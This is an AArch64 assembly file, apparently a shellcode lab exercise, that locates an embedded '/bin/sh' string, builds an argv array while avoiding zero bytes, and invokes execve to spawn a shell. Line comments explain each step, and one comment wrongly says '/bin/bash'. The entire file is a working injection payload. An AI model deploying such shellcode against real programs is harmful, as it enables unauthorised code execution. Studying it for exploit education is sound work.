
.section .text
.global _start

_start:
    b two
one:
    mov x19, x30

    eor  w9, w9, w9      // w9 = 0
    mov  x8, 7           // x8 = the offset of the * in "/bin/sh*"
    strb w9, [x19, x8]   // Null-terminate the "/bin/sh" string 

store_args:    
    mov x8,  8
    mov x9,  x19         // x9  = address of the "/bin/bash" string
    str x9, [x19, x8]    // save x9 to argv[0]

    mov x8, 16
    eor x9, x9, x9       // x9 = 0
    str x9, [x19, x8]    // save 0 to argv[1]
    
execve: 
    mov  x0, x19         // x0 = command string ("/bin/sh")

    adds x11, x19, 88    // x11 = x19 + 88
    mov  x12, 80         // x12 = 80
    sub  x1,  x11, x12   // x1  = x11 - x12 = x19 + 88 - 80 = x19 + 8

    mov  x2, XZR         // x2 = 0; XZR is the zero register
    mov  x8, #221        // 221 is execve's system call number
    svc  #0x1337         // Invoke execve()

two:
    bl one
    .ascii "/bin/sh*"    // offset = 0;  offset of * is 7
    .space 8, 0xAA   // Placeholder for argv[0]: for address to "/bin/sh"
    .space 8, 0xBB   // Placeholder for argv[1]: 0

